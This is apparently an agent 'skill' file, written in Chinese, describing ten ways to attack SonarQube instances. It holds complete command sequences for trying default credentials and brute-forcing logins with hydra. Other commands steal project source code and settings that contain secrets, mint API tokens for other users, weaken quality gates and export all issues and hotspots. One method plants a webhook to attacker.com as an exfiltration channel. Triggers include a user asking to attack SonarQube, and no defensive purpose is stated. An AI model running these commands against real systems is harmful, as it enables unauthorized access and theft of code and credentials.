---
name: sonarqube-attack
type: attack
category: devsecops
platform: sonarqube
severity: medium
---

# SonarQube 攻击技能

## 触发条件

- 有 SonarQube 凭证
- 发现 SonarQube 实例
- 用户要求"攻击 SonarQube"

## 前置检查

```bash
# 1. 测试连接
curl http://sonarqube.example.com/api/server/version

# 2. 检查认证状态
curl -u admin:admin http://sonarqube.example.com/api/user/search

# 3. 列出项目
curl -u admin:admin http://sonarqube.example.com/api/projects/search
```

## 攻击方法

### 方法 1: 默认凭证攻击

```bash
# 1. 测试默认凭证
# 常见默认: admin/admin
for creds in "admin:admin" "admin:sonarqube" "admin:password"; do
  echo "Testing $creds"
  curl -u $creds http://sonarqube.example.com/api/user/search
done

# 2. 暴力破解
hydra -L users.txt -P passwords.txt \
  sonarqube.example.com http-get /api/user/search

# 3. 使用默认 Token
# 某些安装使用默认 Token: admin 的 base64
```

### 方法 2: 项目代码窃取

```bash
# 1. 列出所有项目
curl -u admin:admin \
  "http://sonarqube.example.com/api/projects/search?ps=500" | \
  jq -r '.components[].key'

# 2. 获取项目详情
curl -u admin:admin \
  "http://sonarqube.example.com/api/projects/search?projects=PROJECT_KEY" | \
  jq '.components[]'

# 3. 获取项目源码
curl -u admin:admin \
  "http://sonarqube.example.com/api/sources/raw?key=PROJECT_KEY&uuid=FILE_UUID" \
  -o source_code.py

# 4. 列出所有文件
curl -u admin:admin \
  "http://sonarqube.example.com/api/sources/issue_counts?projectKey=PROJECT_KEY"
```

### 方法 3: Issue 和漏洞利用

```bash
# 1. 获取项目的所有问题
curl -u admin:admin \
  "http://sonarqube.example.com/api/issues/search?componentKeys=PROJECT_KEY&ps=500" | \
  jq -r '.issues[].key'

# 2. 搜索敏感信息相关的问题
curl -u admin:admin \
  "http://sonarqube.example.com/api/issues/search?q=password+OR+secret+OR+token" | \
  jq -r '.issues[] | {key: .key, message: .msg, file: .component}'

# 3. 获取安全问题（Vulnerabilities）
curl -u admin:admin \
  "http://sonarqube.example.com/api/issues/search?types=VULNERABILITY&severities=CRITICAL" | \
  jq '.issues[]'

# 4. 导出所有问题
curl -u admin:admin \
  "http://sonarqube.example.com/api/issues/search?ps=500" \
  -o /tmp/sonarqube-issues.json
```

### 方法 4: 用户凭证窃取

```bash
# 1. 列出所有用户
curl -u admin:admin \
  "http://sonarqube.example.com/api/users/search?ps=500" | \
  jq -r '.users[].login'

# 2. 获取用户详细信息
curl -u admin:admin \
  "http://sonarqube.example.com/api/users/search?q=USER_NAME" | \
  jq '.users[]'

# 3. 查看用户 Token
# 需要管理员权限
curl -u admin:admin \
  "http://sonarqube.example.com/api/user_tokens/search?login=USER_NAME" | \
  jq '.userTokens[]'

# 4. 如果可以生成 Token
curl -X POST -u admin:admin \
  "http://sonarqube.example.com/api/user_tokens/generate?name=attack&login=USER_NAME"
```

### 方法 5: Quality Gate 绕过

```bash
# 1. 获取 Quality Gate 配置
curl -u admin:admin \
  "http://sonarqube.example.com/api/qualitygates/list" | \
  jq '.qualitygates[]'

# 2. 获取项目关联的 Quality Gate
curl -u admin:admin \
  "http://sonarqube.example.com/api/qualitygates/get_by_project?project=PROJECT_KEY"

# 3. 修改 Quality Gate（如果有权限）
curl -X POST -u admin:admin \
  "http://sonarqube.example.com/api/qualitygates/select" \
  -d "gateId=GATE_ID&projectKey=PROJECT_KEY"

# 4. 创建宽松的 Quality Gate
curl -X POST -u admin:admin \
  "http://sonarqube.example.com/api/qualitygates/create" \
  -d "name=Permissive"
```

### 方法 6: Token 利用

```bash
# 1. 使用用户 Token 访问 API
export SONAR_TOKEN="..."
curl -u $SONAR_TOKEN: \
  "http://sonarqube.example.com/api/projects/search"

# 2. 枚举所有 Token
# 如果是管理员，查看所有用户的 Token
curl -u admin:admin \
  "http://sonarqube.example.com/api/user_tokens/revoke?name=token-name&login=USER_NAME"

# 3. 使用 API Token 进行自动化攻击
for project in $(curl -s -u $TOKEN: "http://sonarqube.example.com/api/projects/search?ps=500" | jq -r '.components[].key'); do
  curl -s -u $TOKEN: \
    "http://sonarqube.example.com/api/issues/search?componentKeys=$project&ps=500" | \
    jq -r '.issues[].msg' > /tmp/$project-issues.txt
done
```

### 方法 7: 配置文件窃取

```bash
# 1. 获取全局配置
curl -u admin:admin \
  "http://sonarqube.example.com/api/settings/values"

# 2. 搜索敏感配置
curl -u admin:admin \
  "http://sonarqube.example.com/api/settings/values" | \
  jq '.settings[] | select(.key | contains("password") or contains("token") or contains("secret"))'

# 3. 获取数据库配置
curl -u admin:admin \
  "http://sonarqube.example.com/api/settings/values?key=sonar.jdbc.url"

# 4. 获取 SCM 配置
curl -u admin:admin \
  "http://sonarqube.example.com/api/settings/values?key=sonar.scm.disabled"
```

### 方法 8: Plugin 利用

```bash
# 1. 列出已安装的插件
curl -u admin:admin \
  "http://sonarqube.example.com/api/plugins/installed" | \
  jq '.[] | {key: .key, version: .version}'

# 2. 检查特定插件
# 可能的攻击面:
# - Git/SCM 插件: 可能包含凭证
# - LDAP 插件: 可能包含绑定凭证
# - SAML 插件: 可能包含证书

# 3. 获取插件配置
curl -u admin:admin \
  "http://sonarqube.example.com/api/settings/values?component=PLUGIN_KEY"
```

### 方法 9: Webhook 利用

```bash
# 1. 获取项目的 Webhook 配置
curl -u admin:admin \
  "http://sonarqube.example.com/api/settings/values?component=PROJECT_KEY" | \
  jq '.settings[] | select(.key == "sonar.qualitygate.webhook")'

# 2. 创建恶意 Webhook（如果有权限）
curl -X POST -u admin:admin \
  "http://sonarqube.example.com/api/settings/set" \
  -d "key=sonar.qualitygate.webhook&value=https://attacker.com/webhook"

# 3. 触发 Webhook
# 通过分析项目或修改配置
```

### 方法 10: 批量数据导出

```bash
# 1. 导出所有项目元数据
curl -u admin:admin \
  "http://sonarqube.example.com/api/projects/search?ps=500" | \
  jq '.components[]' > /tmp/projects.json

# 2. 导出所有问题
curl -u admin:admin \
  "http://sonarqube.example.com/api/issues/search?ps=10000" | \
  jq '.issues[]' > /tmp/issues.json

# 3. 导出所有热点（Hotspots）
curl -u admin:admin \
  "http://sonarqube.example.com/api/hotspots/search?ps=10000" | \
  jq '.hotspots[]' > /tmp/hotspots.json

# 4. 导出所有度量
curl -u admin:admin \
  "http://sonarqube.example.com/api/measures/component?component=PROJECT_KEY&metricKeys=bugs,vulnerabilities,code_smells,coverage,duplicated_lines_density" \
  > /tmp/measures.json
```

## 验证成功

```bash
# 成功登录
curl -u admin:admin http://sonarqube.example.com/api/user/search

# 成功列出项目
curl -u admin:admin "http://sonarqube.example.com/api/projects/search"

# 成功获取代码
curl -u admin:admin \
  "http://sonarqube.example.com/api/sources/raw?key=PROJECT_KEY&uuid=FILE_UUID"
```

## 下一步

1. 分析代码中的漏洞和敏感信息
2. 使用发现的凭证访问 Git 仓库
3. 利用 SonarQube 配置了解安全策略
4. 通过 Webhook 建立数据外泄通道
